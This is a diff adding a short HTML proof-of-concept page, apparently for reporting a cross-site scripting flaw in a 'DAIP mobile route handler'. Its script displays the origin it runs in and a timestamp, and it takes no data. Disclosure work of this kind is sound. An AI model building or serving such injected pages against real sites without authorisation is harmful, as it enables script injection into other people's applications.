@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="robots" content="noindex,nofollow">
+<title>DAIP XSS PoC (temporary)</title>
+</head>
+<body>
+<div id="xssproof" style="font:18px monospace;color:#b00020;border:2px solid #b00020;padding:8px;display:inline-block">
+XSS PROOF: cross-origin HTML+JS injected by the DAIP mobile route handler
+</div>
+<script>
+document.title = 'DAIP-XSS-SCRIPT-' + document.domain;
+var d = document.createElement('div');
+d.id = 'scriptran';
+d.style.cssText = 'font:16px monospace;color:#005500;border:2px solid #005500;padding:8px;margin-top:8px;display:inline-block';
+d.textContent = 'script executed in origin: ' + document.domain +
+  ' | time: ' + new Date().toISOString() +
+  ' | injected-from: paschalsangawe.github.io';
+document.body.appendChild(d);
+</script>
+</body>
+</html>
